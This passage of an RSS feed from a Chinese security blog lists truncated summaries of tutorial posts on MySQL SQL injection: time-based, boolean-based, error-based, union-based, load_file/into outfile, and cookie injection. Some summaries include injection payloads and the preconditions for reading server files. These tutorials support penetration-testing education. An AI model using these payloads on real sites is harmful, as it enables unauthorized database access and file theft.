字符型的话需要闭合: ?id=2&amp;#39; and if(1=1,sleep(2),1) and &amp;#39;1
&lt;/code>&lt;/pre>&lt;h3 id="0x02-相关函数">0x02 相关函数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>if(条件, 值1, 值2)&lt;br>
当条件为真时返回值1，条件为假时返回值2&lt;/p></description></item><item><title>SQL 注入之布尔型注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link><pubDate>Thu, 23 Jun 2016 23:32:34 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位，且没有用echo &amp;#34;mysql_error()&amp;#34;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
&lt;/code>&lt;/pre>&lt;h3 id="0x02-注入步骤">0x02 注入步骤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>找到注入点，判断闭合字符
&lt;img src="https://wyb0.com/img/post/sqli8_get_closed_character.png" alt="得到闭合字符">&lt;/p></description></item><item><title>SQL 注入之报错型注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-error-based/</link><pubDate>Wed, 22 Jun 2016 15:30:54 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;pre tabindex="0">&lt;code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):&lt;/p></description></item><item><title>SQL 注入之联合查询(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-union-select/</link><pubDate>Tue, 21 Jun 2016 22:30:18 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;p>要用联合查询进行注入则：页面必须有显示位&lt;/p>
&lt;h3 id="0x01-联合查询">0x01 联合查询&lt;/h3>
&lt;p>union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同&lt;/p></description></item><item><title>SQL 注入之 load_file 和 into outfile(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link><pubDate>Mon, 20 Jun 2016 08:10:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid><description>&lt;h3 id="0x00-load_file-读文件">0x00 load_file() 读文件&lt;/h3>
&lt;ul>
&lt;li>条件:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1. 要有file_priv权限: show global variables like &amp;#39;%secure%&amp;#39;;
2. 知道文件绝对路径
3. 能使用union
4. 对web目录有读权限 
注：若过滤了单引号，则可以将函数中的字符进行hex编码
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>一般步骤&lt;/p></description></item><item><title>SQL 注入</title><link>https://wyb0.com/posts/2016/injection/</link><pubDate>Sun, 19 Jun 2016 20:18:48 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection/</guid><description>&lt;h3 id="0x00-含义">0x00 含义&lt;/h3>
&lt;p>sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，&lt;/p></description></item><item><title>ASP Cookie 处联合注入</title><link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link><pubDate>Fri, 04 Dec 2015 19:42:19 +0000</pubDate><guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid><description>&lt;h3 id="0x00-cookie注入的使用">0x00 Cookie注入的使用&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>三大Web提交方式&lt;/p>
&lt;ul>
&lt;li>GET：直接在浏览器上面访问地址&lt;/li>
&lt;li>POST：提交表单(会员注册、文件上传等)&lt;/li>
&lt;li>COOKIE：访问网站下面自带的身份验证的值&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Cookie注入利用时机&lt;br>
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。
&lt;img src="https://wyb0.com/img/post/cookie_injection_conditions.png" alt="Cookie注入条件">&lt;/p></description></item></channel></rss>